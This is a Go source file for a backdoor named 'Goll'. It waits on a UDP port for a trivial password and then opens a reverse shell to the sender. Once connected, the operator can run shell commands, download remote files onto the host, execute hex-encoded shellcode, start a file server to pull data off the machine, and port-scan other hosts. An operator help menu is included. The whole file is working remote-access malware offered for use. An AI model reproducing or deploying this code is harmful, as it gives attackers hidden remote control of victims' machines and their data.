// +build windows linux

// Reverse Windows CMD
// Test with nc -lvvp 6666
package main

import (
	"bufio"
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	// UDPLISTENPORT is the local UDP port on which it is constantly going to be listening.
	UDPLISTENPORT = 6666
	// UDPREVERSEPORT is the remote UDP port on which it is going to connect.
	UDPREVERSEPORT = "5555"
	// HTTPPORT is the port on which the httpserver is going to be mounted
	HTTPPORT = "4444"
)

func main() {
	for true {
		UDPBind()
	}
}

// FunctionRecovery is called if an error occurs. Hopefully it doesn't, but there's always a catch.
func FunctionRecovery() {
	if r := recover(); r != nil {
		fmt.Println("recovered from ", r)
	}
}

// Download is able to download a file from a given URL, just like wget would.
func Download(url string) string {
	defer FunctionRecovery()
	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return "Download failed"
	}
	defer resp.Body.Close()

	// Create the file
	path := strings.Split(url, "/")
	filename := path[len(path)-1]
	filepath := "./" + filename
	out, err := os.Create(filepath)
	if err != nil {
		return "Download failed"
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	if err == nil {
		output := "Download of file " + filename + " was complete"
		return output
	}
	return "Download failed"
}

// GetEnv checks whether the environment we're working on is Windows or *NIX, and sets the commands to use for one or another.
func GetEnv() (string, string) {
	defer FunctionRecovery()
	if runtime.GOOS == "windows" {
		return "cmd", "/C"
	}
	// else
	return "bash", "-c"

}

// LaunchServer launches a server on the desired port
func LaunchServer(port string) {
	defer FunctionRecovery()
	wdir, _ := os.Getwd()
	mux := http.NewServeMux()
	s := http.Server{Addr: ":" + port, Handler: mux}
	mux.HandleFunc("/shutdown", func(w http.ResponseWriter, r *http.Request) {
		s.Shutdown(context.Background())
		//s.Close()
	})
	mux.Handle("/", http.FileServer(http.Dir(wdir)))
	if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatal(err)
	}
}

// Server runs a FileServer for a specific time at the specified port.
// 10 minutes is the default timer.
func Server(timer int, port string) {
	defer FunctionRecovery()
	checker, err := net.Listen("tcp", ":"+port)
	checker.Close()
	if err != nil {
		KillServer(0, port)
	}
	go LaunchServer(port)
	KillServer(timer, port)
}

// KillServer kills the FileServer that is being, if any.
func KillServer(timer int, port string) {
	defer FunctionRecovery()
	time.Sleep(time.Duration(timer) * time.Minute)
	url := "http://localhost:" + port + "/shutdown"
	req, _ := http.NewRequest("GET", url, nil)
	res, _ := http.DefaultClient.Do(req)
	defer res.Body.Close()
}

// LaunchScan launches a PortScan
func LaunchScan(commands []string) string {
	switch len(commands) {
	case 3:
		//false disables debug
		return scan(commands[1], commands[2], false)
	default:
		return menu("scan")
	}
}

// CommandExec reads the input and redirects it to a cmd/bash, depending on the OS we're dealing with
// It returns the output of the entered command
func CommandExec(cmd string) string {
	defer FunctionRecovery()
	if cmd != "" {
		commands := strings.Split(cmd, " ")
		command := strings.ToLower(commands[0])
		switch command {
		case "cd":
			if len(commands) == 2 {
				os.Chdir(commands[1])
			} else if len(commands) > 2 {
				cds := strings.Split(cmd, "\"")
				if len(cds) > 1 {
					os.Chdir(cds[1])
				} else {
					cds := strings.Join(commands[1:], " ")
					os.Chdir(cds)
				}
			}
			wdir, _ := os.Getwd()
			return wdir + "\n"
		case "download":
			if len(commands) >= 2 {
				down := strings.Join(commands[1:], " ")
				Download(down)
				return "Download complete\n"
			}
			return menu("download")
		case "server":
			if len(commands) == 1 {
				go Server(10, HTTPPORT)
				return "Turning up server for 10 minutes on port " + HTTPPORT + ", shutting down afterwards.\n"
			} else if len(commands) == 2 {
				timer, err := strconv.Atoi(commands[1])
				if err != nil {
					go Server(10, HTTPPORT)
					return "It looks like " + commands[1] + " was not a valid integer. Turning server on for 10 minutes on port " + HTTPPORT + ".\n"
				}
				if timer > 60 {
					go Server(10, HTTPPORT)
					return "You kidding me? " + commands[1] + " minutes? No way, I'll turn up the server for 10 minutes on port " + HTTPPORT + " and that's it, I'll shut it down afterwards.\n"
				}
				go Server(timer, HTTPPORT)
				return "Turning up server for " + commands[1] + " minutes on port " + HTTPPORT + ", shutting down afterwards.\n"
			} else if len(commands) == 3 {
				timer, err := strconv.Atoi(commands[1])
				if err != nil {
					go Server(10, HTTPPORT)
					return "It looks like " + commands[1] + " was not a valid integer. Turning server on for 10 minutes on port " + HTTPPORT + ".\n"
				}
				if _, err = strconv.Atoi(commands[2]); err != nil {
					go Server(10, HTTPPORT)
					return "It looks like " + commands[1] + " was not a valid integer. Turning server on for 10 minutes on port " + HTTPPORT + ".\n"
				}
				if timer > 60 {
					go Server(10, HTTPPORT)
					return "You kidding me? " + commands[1] + " minutes? No way, I'll turn up the server for 10 minutes on port " + HTTPPORT + " and that's it, I'll shut it down afterwards.\n"
				}
				go Server(timer, commands[2])
				return "Turning up server for " + commands[1] + " minutes on port " + commands[2] + ", shutting down afterwards.\n"
			} else {
				return "Up to 2 arguments are allowed.\n"
			}
		case "killserver":
			if len(commands) == 1 {
				KillServer(0, HTTPPORT)
				return "killed server on " + HTTPPORT
			} else if len(commands) == 2 {
				if _, err := strconv.Atoi(commands[1]); err != nil {
					KillServer(0, commands[1])
					return "Killed server on port " + commands[1]
				}
			} else {
				return "Wrong length"
			}
		case "pwd":
			wdir, _ := os.Getwd()
			return wdir + "\n"
		case "bye":
			go KillServer(0, HTTPPORT)
			return "exit"
		case "exec":
			sc, _ := hex.DecodeString(commands[1])
			go Run(sc)
		case "scan":
			return LaunchScan(commands)
		case "menu":
			if len(commands) == 1 {
				return menu("general")
			} else if len(commands) == 2 {
				arg := strings.ToLower(commands[1])
				return menu(arg)
			} else {
				return "This does not work like that, sorry. This command expects at most 1 argument, not more."
			}
		default:
			parser, arg := GetEnv()
			output, err := exec.Command(parser, arg, cmd).Output()
			if err != nil {
				fmt.Println(err)
			}
			return string(output)
		}
		return "Something has failed and I wouldn't know what it is. Please try again later.\n"
	}
	return ""
}

func menu(menu string) string {
	switch menu {
	case "general":
		return `
		Goll is usually able to run console commands and all that stuff. Every module has a small MENU file.
		MENU is used because HELP is already taken by shell commands, and we don't want to overlap stuff, do we?
		Please note that this has been developed by a golang newbie and expects you to know more or less what you are doing, so try not to break it.
		Following modules are available (and accessible by typing menu MODULE):

		download		Download to the client
		exec			Run code (must be in HEX)
		server			Runs a http webserver
		scan			Runs a simple TCP scanner
		killserver		Kills the http webserver
		bye				Terminates the connection
		`
	case "download":
		return `
		DOWNLOAD is the command to download files from the client to itself. 
		It works like wget would (probably), but without so many options.
		It downloads a file into the directory it is currently.
		Usage:
		download https://notanevilwebsite.com/notbadstuff.zip	Downloads the file notbadstuff.zip in the current directory
		`
	case "exec":
		return `
		EXEC is able to execute code. You know the drill. Generate it in HEX format, copy it and voilá.
		However, it is in very early and experimental stage, because I have no idea how it works, so.... Yeah. Us it at your own risk.
		Usage:
		generate code
		Goll> exec (code)
		`
	case "server":
		return `
		SERVER is the command to launch a fileserver over the net. It is helpful if you want to download a file from the client.
		You can pass up to 2 arguments, TIME and PORT.
		TIME is the amount of time the webserver will be running before it closes (It can't run forever, you know...)
		PORT is the TCP port on which you want to launch the server. Please watch out for permissions regarding protected ports.

		Usage:
		server			runs the webserver for 10 minutes on tcp port 20212
		server 15		runs the webserver for 15 minutes on tcp port 20212
		server 5 5555	runs the webserver for 5 minutes on tcp port 5555
		`
	case "killserver":
		return `
		KILLSERVER is the command to kill the webserver. 
		You can also kill the websver 
		You can pass the port as parameter if you specified a different PORT when running the SERVER command. Default port is 20212.
		KILLSERVER is automatically called after the time specified when using SERVER.
		Usage: 
		killserver		kills the webserver running on localhost:20212
		killserver PORT	kills the webserver running on PORT
		`
	case "scan":
		return `
		SCAN is able to do a simple TCP portscan.
		It is not recommended to scan many ports, for it is slow and inefficient.
		Usage:
		scan HOST port-port			scans a portrange
		scan HOST port				scans a single port
		scan HOST port-port,port	scans a portrange and a single port
		`
	case "bye":
		return `
		BYE closes the connection. It is sad to see you go, but oh well...`

	default:
		return "This command is unknown to my eyes. This probably means you can look it up on the MAN pages running COMMAND -h, COMMAND --help or COMMAND /?, depending on which system you are."
	}
}

// GetCommand handles the connection
func GetCommand(scanner *bufio.Scanner, connUDP *net.UDPConn) {
	defer FunctionRecovery()
	connUDP.SetReadDeadline(time.Now().Add(60 * time.Second))
	fmt.Fprintf(connUDP, "Goll> ")
	for scanner.Scan() {
		connUDP.SetReadDeadline(time.Now().Add(360 * time.Second))
		result := CommandExec(scanner.Text())
		if result == "exit" {
			connUDP.Close()
			return
		}
		// else
		if result != "" {
			fmt.Fprintf(connUDP, result+"\n")
		}
		fmt.Fprintf(connUDP, "Goll> ")
	}

}

// UDPReverse creates a reverse UDP connection to a specific port.
func UDPReverse(host *net.UDPAddr, port string) {
	defer FunctionRecovery()
	obj := host.IP.String() + ":" + port
	remoteAddr, err := net.ResolveUDPAddr("udp", obj)
	conn, err := net.DialUDP("udp", nil, remoteAddr)
	if err != nil {
		log.Fatal(err)
	}
	//log.Printf("Established connection to %s \n", remoteAddr)
	//log.Printf("Remote UDP address : %s \n", conn.RemoteAddr().String())
	//log.Printf("Local UDP client address : %s \n", conn.LocalAddr().String())
	defer conn.Close()
	scanner := bufio.NewScanner(bufio.NewReader(conn))
	fmt.Fprintf(conn, "\n")
	GetCommand(scanner, conn)
}

// UDPBind opens a UDP socket and waits for a password. If the password is correct, it opens a reverse shell to the client that initiated the bind connection.
func UDPBind() {
	defer FunctionRecovery()
	message := make([]byte, 2048)
	addr := net.UDPAddr{
		Port: UDPLISTENPORT,
		IP:   net.ParseIP("0.0.0.0"),
	}
	ser, err := net.ListenUDP("udp", &addr)
	if err != nil {
		fmt.Printf("Some error %v\n", err)
		return
	}
	for {
		rlen, remoteaddr, err := ser.ReadFromUDP(message)
		if err != nil {
			fmt.Printf("Some error  %v", err)
			continue
		}
		commands := strings.Split(strings.TrimSpace(string(message[:rlen])), " ")
		data := commands[0]
		//data := strings.TrimSpace(string(message[:rlen]))
		fmt.Printf("received: %s from %s\n", data, remoteaddr)
		if data == "cmd" {
			var port string
			if len(commands) == 1 {
				port = UDPREVERSEPORT
			} else {
				_, err := strconv.Atoi(commands[1])
				if err != nil {
					port = UDPREVERSEPORT
				} else {
					port = commands[1]
				}
			}
			go ser.WriteToUDP([]byte("From server: correct password \n"), remoteaddr)
			go UDPReverse(remoteaddr, port)
		} else if data == "reset" {
			ser.Close()
			return
		} else {
			go ser.WriteToUDP([]byte("From server: wrong password \n"), remoteaddr)
		}
	}
}
